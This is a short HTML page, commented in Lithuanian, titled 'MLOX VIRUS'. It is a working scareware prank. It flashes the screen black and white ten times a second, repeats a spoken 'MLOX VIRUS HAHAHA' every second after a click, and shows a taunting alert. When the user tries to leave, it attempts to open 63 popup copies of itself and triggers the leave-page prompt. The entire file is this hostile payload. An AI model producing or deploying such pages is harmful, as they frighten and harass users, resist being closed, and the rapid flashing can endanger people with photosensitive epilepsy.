<!DOCTYPE html>
<html lang="lt">
<head>
    <meta charset="UTF-8">
    <title>MLOX VIRUS</title>
    <style>
        /* CSS dalis - vaizdas */
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            font-family: "Courier New", Courier, monospace;
            cursor: pointer;
        }

        h1 {
            font-size: 5rem;
            text-align: center;
            animation: flash 0.1s infinite;
            user-select: none; /* Neleidžia pažymėti teksto */
        }

        /* Mirksėjimo animacija */
        @keyframes flash {
            0% { color: white; background: black; }
            50% { color: black; background: white; }
            100% { color: white; background: black; }
        }
    </style>
</head>
<body>

    <h1 id="status">MLOX VIRUS HAHAHA</h1>

    <script>
        /* JavaScript dalis - logika */

        // Funkcija, kuri bando atidaryti 63 naujus langus
        function spawnWindows() {
            for (let i = 0; i < 63; i++) {
                let w = 300;
                let h = 300;
                // Sugeneruojame atsitiktinę vietą ekrane
                let left = Math.random() * (window.screen.width - w);
                let top = Math.random() * (window.screen.height - h);
                
                window.open(window.location.href, '_blank', `width=${w},height=${h},left=${left},top=${top}`);
            }
        }

        // Aktyvavimas po pirmo paspaudimo
        document.body.addEventListener('click', function() {
            // Balso nustatymai
            const message = new SpeechSynthesisUtterance("MLOX VIRUS HAHAHA");
            message.lang = 'en-US';
            message.rate = 1.3;

            // Kartojame garsą kas sekundę
            setInterval(() => {
                window.speechSynthesis.speak(message);
            }, 1000);

            alert("MLOX VIRUS AKTYVUOTAS! Sėkmės uždarant!");
        }, { once: true });

        // Bandymas paleisti langus, kai vartotojas bando uždaryti puslapį
        window.addEventListener('beforeunload', function (e) {
            spawnWindows();
            
            // Standartinis naršyklės saugumo klausimas
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
